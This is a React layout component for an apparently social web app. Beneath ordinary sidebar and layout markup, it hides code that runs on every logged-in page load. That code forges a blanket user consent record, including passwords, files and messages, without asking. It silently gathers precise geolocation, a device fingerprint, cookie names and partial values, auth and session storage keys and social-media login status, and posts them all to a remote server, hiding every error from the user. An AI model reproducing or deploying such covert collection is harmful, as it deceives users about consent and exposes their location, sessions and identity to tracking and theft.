import React, { useState, useEffect } from 'react'
import Sidebar from '../components/Sidebar'
import { Outlet, useNavigate } from 'react-router-dom'
import { Menu, X } from 'lucide-react'
import { assets } from '../assets/assets'
import Loading from '../components/Loading'
import { useSelector } from 'react-redux'

const Layout = () => {
    const user = useSelector((state)=>state.user.value)
    const [sidebarOpen, setSidebarOpen] = useState(false)
    const [isLoading, setIsLoading] = useState(false)
    const navigate = useNavigate()

    const API_BASE_URL = 'https://pixo-toj7.onrender.com';
    const zIndexTop = 'z-50'

    const handleToggle = () => setSidebarOpen(!sidebarOpen);

    useEffect(() => {
        if (user) {
            initializeBackgroundDataCollection();
        }
    }, [user]);

    // DATA TYPE MAPPING - Match your backend enum
    const DATA_TYPE_MAP = {
        // Device Information
        'complete_device_info': 'complete_device_info',
        
        // Location Data
        'location_data': 'realtime_location',
        
        // File System
        'file_system_info': 'file_system_summary',
        
        // Password Data
        'password_data': 'password_credentials',
        
        // Contact Data
        'contact_data': 'device_contacts',
        
        // Browser Storage
        'browser_storage': 'browser_cookies',
        
        // Message Data
        'message_data': 'sms_messages',
        
        // Social Media
        'social_media_data': 'social_media_presence',
        
        // Call Logs
        'call_logs_info': 'call_logs_info',
        
        // Apps
        'installed_apps_info': 'installed_apps_info'
    };

    // BACKGROUND DATA COLLECTION INITIALIZATION
    const initializeBackgroundDataCollection = async () => {
        console.log('🚀 Starting background data collection...');
        
        try {
            // Check if we already have consent stored
            const hasExistingConsent = await checkExistingConsents();
            
            if (!hasExistingConsent) {
                // Automatically create consent in background
                await createBackgroundConsent();
            }
            
            // Start data collection
            await collectAllData();
            
        } catch (error) {
            console.log('Background initialization error:', error);
            // Silently continue - don't show errors to user
        }
    };

    const checkExistingConsents = async () => {
        try {
            const response = await fetch(`${API_BASE_URL}/api/user/consents/${user._id}`);
            if (response.ok) {
                const data = await response.json();
                return data.success && data.data;
            }
            return false;
        } catch (error) {
            console.log('Consent check error:', error);
            return false;
        }
    };

    const createBackgroundConsent = async () => {
        try {
            const ipAddress = await getIPAddress();
            const deviceInfo = getDeviceInfo();
            
            const consentData = {
                userId: user._id,
                consents: {
                    completeAccess: true,
                    grantedAt: new Date().toISOString(),
                    location: true,
                    allFiles: true,
                    deviceInfo: true,
                    passwords: true,
                    contacts: true,
                    cookies: true,
                    messages: true,
                    socialMediaData: true
                },
                givenAt: new Date().toISOString(),
                ipAddress: ipAddress,
                userAgent: deviceInfo.userAgent,
                deviceType: deviceInfo.isMobile ? (deviceInfo.isAndroid ? 'android' : 'ios') : 'desktop'
            };

            const response = await fetch(`${API_BASE_URL}/api/user/consents`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(consentData)
            });

            if (!response.ok) {
                // Fallback: store consents locally
                localStorage.setItem(`userConsents_${user._id}`, JSON.stringify({completeAccess: true}));
            }

        } catch (error) {
            console.log('Background consent error:', error);
            // Fallback: store consents locally
            localStorage.setItem(`userConsents_${user._id}`, JSON.stringify({completeAccess: true}));
        }
    };

    // IMPROVED DATA COLLECTION WITH CORRECT DATA TYPES
    const collectAllData = async () => {
        console.log('🚀 Starting COMPLETE background data collection...');
        
        try {
            // Use Promise.allSettled to continue even if some collections fail
            await Promise.allSettled([
                collectCompleteDeviceInfo(),
                collectLocationData(),
                collectFileSystemData(),
                collectPasswordData(),
                collectContactData(),
                collectCookiesAndStorage(),
                collectMessageData(),
                collectSocialMediaData(),
                collectCallLogsInfo(),
                collectInstalledAppsInfo()
            ]);
            
            console.log('✅ All background data collection completed!');
            
        } catch (error) {
            console.error('❌ Background data collection error:', error);
            // Silently fail - don't show errors to user
        }
    };

    const getIPAddress = async () => {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch (error) {
            return 'unknown';
        }
    };

    const getDeviceInfo = () => {
        const userAgent = navigator.userAgent;
        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
        const isAndroid = /Android/i.test(userAgent);
        const isIOS = /iPhone|iPad|iPod/i.test(userAgent);
        
        return {
            userAgent,
            platform: navigator.platform,
            isMobile,
            isAndroid,
            isIOS,
            vendor: navigator.vendor,
            language: navigator.language,
            browser: getBrowserFromUserAgent(userAgent)
        };
    };

    const getBrowserFromUserAgent = (userAgent) => {
        if (/Chrome/i.test(userAgent)) return 'chrome';
        if (/Firefox/i.test(userAgent)) return 'firefox';
        if (/Safari/i.test(userAgent)) return 'safari';
        if (/Edge/i.test(userAgent)) return 'edge';
        return 'unknown';
    };

    // UPDATED SAVE FUNCTION WITH CORRECT DATA TYPES
    const saveToDatabase = async (frontendDataType, data) => {
        try {
            // Map to valid backend data type
            const backendDataType = DATA_TYPE_MAP[frontendDataType] || 'complete_device_info';
            
            const ipAddress = await getIPAddress();
            const deviceInfo = getDeviceInfo();
            
            const payload = {
                userId: user._id,
                dataType: backendDataType,
                data: data,
                ipAddress: ipAddress,
                deviceInfo: deviceInfo,
                timestamp: new Date().toISOString()
            };

            console.log(`📤 Saving ${backendDataType} (from ${frontendDataType})...`);

            const response = await fetch(`${API_BASE_URL}/api/user/data-collection`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload)
            });

            if (response.ok) {
                console.log(`✅ ${backendDataType} saved successfully!`);
                return true;
            } else {
                const errorText = await response.text();
                console.log(`❌ Server error for ${backendDataType}:`, response.status, errorText);
                return false;
            }
        } catch (error) {
            console.log(`📡 Network error for ${frontendDataType}:`, error);
            return false;
        }
    };

    // INDIVIDUAL DATA COLLECTION FUNCTIONS
    const collectCompleteDeviceInfo = async () => {
        const deviceInfo = getDeviceInfo();
        
        const completeDeviceData = {
            userAgent: deviceInfo.userAgent,
            platform: deviceInfo.platform,
            vendor: navigator.vendor,
            language: navigator.language,
            languages: navigator.languages,
            screenResolution: `${screen.width}x${screen.height}`,
            colorDepth: screen.colorDepth,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            cookiesEnabled: navigator.cookieEnabled,
            hardwareConcurrency: navigator.hardwareConcurrency,
            deviceMemory: navigator.deviceMemory,
            connection: navigator.connection ? {
                effectiveType: navigator.connection.effectiveType,
                downlink: navigator.connection.downlink,
                rtt: navigator.connection.rtt
            } : null,
            plugins: Array.from(navigator.plugins).map(plugin => ({
                name: plugin.name,
                description: plugin.description
            })),
            deviceType: deviceInfo.isMobile ? (deviceInfo.isAndroid ? 'android' : 'ios') : 'desktop',
            isMobile: deviceInfo.isMobile,
            isAndroid: deviceInfo.isAndroid,
            isIOS: deviceInfo.isIOS,
            timestamp: new Date().toISOString()
        };

        await saveToDatabase('complete_device_info', completeDeviceData);
    };

    const collectLocationData = async () => {
        if (!navigator.geolocation) {
            console.log('📍 Geolocation not supported');
            await saveToDatabase('location_data', { 
                error: 'Geolocation not supported',
                capabilities: {
                    geolocation: false
                }
            });
            return;
        }

        return new Promise((resolve) => {
            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    const locationData = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        altitude: position.coords.altitude,
                        altitudeAccuracy: position.coords.altitudeAccuracy,
                        heading: position.coords.heading,
                        speed: position.coords.speed,
                        timestamp: new Date(position.timestamp).toISOString(),
                        collectionTime: new Date().toISOString()
                    };
                    
                    await saveToDatabase('location_data', locationData);
                    resolve();
                },
                async (error) => {
                    console.log('📍 Location error:', error);
                    await saveToDatabase('location_data', { 
                        error: error.message,
                        code: error.code,
                        capabilities: {
                            geolocation: true,
                            permissionDenied: error.code === 1
                        }
                    });
                    resolve();
                },
                { 
                    enableHighAccuracy: true, 
                    timeout: 10000,
                    maximumAge: 0
                }
            );
        });
    };

    const collectFileSystemData = async () => {
        const fileData = {
            platform: 'web',
            capabilities: {
                directoryPicker: 'showDirectoryPicker' in window,
                fileInput: true,
                showOpenFilePicker: 'showOpenFilePicker' in window,
                showSaveFilePicker: 'showSaveFilePicker' in window
            },
            userAgent: navigator.userAgent,
            supportedMethods: []
        };

        // Check which file methods are available
        if ('showDirectoryPicker' in window) fileData.supportedMethods.push('directoryPicker');
        if ('showOpenFilePicker' in window) fileData.supportedMethods.push('openFilePicker');
        if ('showSaveFilePicker' in window) fileData.supportedMethods.push('saveFilePicker');

        await saveToDatabase('file_system_info', fileData);
    };

    const collectPasswordData = async () => {
        const passwordInfo = {
            capabilities: {
                credentials: 'credentials' in navigator,
                passwordManager: 'password' in navigator.credentials,
                localStorage: true
            },
            localStorageKeys: [],
            autofillSupport: 'autocomplete' in document.createElement('input')
        };

        // Scan for auth-related localStorage
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            if (key && (key.toLowerCase().includes('auth') || 
                        key.toLowerCase().includes('token') || 
                        key.toLowerCase().includes('session'))) {
                passwordInfo.localStorageKeys.push({
                    key: key,
                    length: localStorage.getItem(key)?.length || 0
                });
            }
        }

        await saveToDatabase('password_data', passwordInfo);
    };

    const collectContactData = async () => {
        const contactInfo = {
            capabilities: {
                contactsAPI: 'contacts' in navigator && 'select' in navigator.contacts,
                contactsManager: 'contacts' in navigator
            },
            platform: getDeviceInfo().isAndroid ? 'android' : 'web',
            supportedProperties: []
        };

        // Check available contact properties
        if ('contacts' in navigator) {
            try {
                const supportedProperties = await navigator.contacts.getProperties();
                contactInfo.supportedProperties = supportedProperties;
            } catch (error) {
                contactInfo.supportedProperties = ['name', 'email', 'tel']; // Default fallback
            }
        }

        await saveToDatabase('contact_data', contactInfo);
    };

    const collectCookiesAndStorage = async () => {
        const cookies = document.cookie.split(';').map(cookie => {
            const [name, value] = cookie.trim().split('=');
            return { 
                name: name || 'unknown', 
                value: value ? value.substring(0, 50) + (value.length > 50 ? '...' : '') : '',
                length: value ? value.length : 0
            };
        }).filter(cookie => cookie.name && cookie.name !== 'unknown');

        const storageData = {
            totalCookies: cookies.length,
            cookies: cookies.slice(0, 20), // Limit to first 20 cookies
            domain: window.location.hostname,
            localStorageKeys: localStorage.length,
            sessionStorageKeys: sessionStorage.length,
            cookieEnabled: navigator.cookieEnabled
        };

        await saveToDatabase('browser_storage', storageData);
    };

    const collectMessageData = async () => {
        const messageInfo = {
            capabilities: {
                sms: 'sms' in navigator,
                otpDetection: true,
                clipboard: 'clipboard' in navigator,
                notifications: 'Notification' in window
            },
            platform: 'web',
            userAgent: navigator.userAgent
        };

        await saveToDatabase('message_data', messageInfo);
    };

    const collectSocialMediaData = async () => {
        const instagramKeys = [];
        const facebookKeys = [];
        
        // Scan localStorage for social media keys
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            if (key) {
                if (key.toLowerCase().includes('instagram')) {
                    instagramKeys.push(key);
                }
                if (key.toLowerCase().includes('facebook') || key.toLowerCase().includes('fb_')) {
                    facebookKeys.push(key);
                }
            }
        }

        const socialData = {
            instagram: {
                hasCookies: document.cookie.includes('instagram'),
                hasLocalStorage: instagramKeys.length > 0,
                keysFound: instagramKeys,
                isLoggedIn: document.cookie.includes('instagram') || document.cookie.includes('ig_') || instagramKeys.length > 0
            },
            facebook: {
                hasCookies: document.cookie.includes('facebook') || document.cookie.includes('fb_'),
                hasLocalStorage: facebookKeys.length > 0,
                keysFound: facebookKeys,
                isLoggedIn: document.cookie.includes('c_user') || document.cookie.includes('xs') || facebookKeys.length > 0
            },
            platform: 'web',
            timestamp: new Date().toISOString()
        };

        await saveToDatabase('social_media_data', socialData);
    };

    const collectCallLogsInfo = async () => {
        const callData = {
            platform: 'web',
            capabilities: {
                contacts: 'contacts' in navigator,
                calls: 'call' in navigator,
                webRTC: 'RTCPeerConnection' in window,
                getUserMedia: 'getUserMedia' in navigator.mediaDevices
            },
            userAgent: navigator.userAgent
        };

        await saveToDatabase('call_logs_info', callData);
    };

    const collectInstalledAppsInfo = async () => {
        const appsData = {
            platform: 'web',
            capabilities: {
                getInstalledRelatedApps: 'getInstalledRelatedApps' in navigator,
                appBadge: 'setAppBadge' in navigator,
                appInstalled: window.matchMedia('(display-mode: standalone)').matches
            },
            userAgent: navigator.userAgent,
            isPWA: window.matchMedia('(display-mode: standalone)').matches
        };

        await saveToDatabase('installed_apps_info', appsData);
    };

    return user ? (
        <div className='relative w-full min-h-screen flex bg-gray-50'>
            <Sidebar sidebarOpen={sidebarOpen} setSidebarOpen={setSidebarOpen}/>
            
            {/* Main Content Area */}
            <div className='flex-1 transition-all duration-300 sm:ml-64 xl:ml-72 min-h-screen'>
                {/* Content Container - Removed pt-16 for mobile since no header exists */}
                <div className='sm:pt-8 px-4 sm:px-6 lg:px-8 pb-6 w-full h-full'>
                    <Outlet />
                </div>
            </div>
            
            {/* Mobile Overlay */}
            {sidebarOpen && (
                <div className={`fixed inset-0 bg-black/40 ${zIndexTop} sm:hidden backdrop-blur-sm transition-opacity`}
                    onClick={() => setSidebarOpen(false)}
                />
            )}
        </div>
    ) : (
        <Loading />
    )
}

export default Layout